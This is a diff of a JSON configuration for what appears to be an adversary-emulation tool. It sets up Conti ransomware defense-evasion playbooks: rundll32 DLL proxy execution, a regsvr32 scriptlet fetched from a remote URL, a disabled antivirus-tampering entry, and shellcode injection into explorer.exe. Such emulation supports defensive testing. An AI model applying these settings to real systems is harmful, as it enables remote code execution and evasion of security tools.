@@ -5,29 +5,27 @@
     {
       "name": "Conti Ransomware Emulation - Defense Evasion - Executing code with LOLBAS",
       "enabled": true,
-      "task_sleep": 3,
+      "playbook_sleep": 5,
       "tasks": [
         {
           "technique_id": "T1218.011",
           "technique_name": "System Binary Proxy Execution: Rundll32",
-          "dllPath": "C:\\Users\\bla\\Appdata\\Local\\Temp\\7A86.dll",
-          "exportName": "DllRegisterServer"
+          "filePath": " C:\\Windows\\Temp\\files\\dll.dll StartW"
         },
         {
           "technique_id": "T1218.010",
           "technique_name": "System Binary Proxy Execution: Regsvr32",
-          "url": "http://10.0.1.14/file.sct",
-          "dllPath": "scrobj.dll"
+          "url": "http://100.1.1.169:8080/T1218.010.sct"
         }
       ]
     },
     {
-      "name": "Conti Ransomware Emulation - Defense Evasion - Disable AV",
-      "enabled": true,
-      "task_sleep": 3,
+      "name": "这里还没实现 Conti Ransomware Emulation - Defense Evasion - Disable AV",
+      "enabled": false,
+      "playbook_sleep": 5,
       "tasks": [
         {
-          "technique_id":"T1562.001",
+          "technique_id": "T1562.001",
           "technique_name": "Impair Defenses: Disable or Modify Tools"
         },
         {
@@ -40,12 +38,12 @@
     {
       "name": "Conti Ransomware Emulation - Defense Evasion - Inject shellcode to explorer.exe ",
       "enabled": true,
-      "task_sleep": 3,
+      "playbook_sleep": 5,
       "tasks": [
         {
           "technique_id": "T1055.002",
           "technique_name": "Process Injection: Portable Executable Injection",
-          "process_name": "explorer"
+          "filePath": "C:\\Windows\\explorer.exe"
         }
       ]
     }
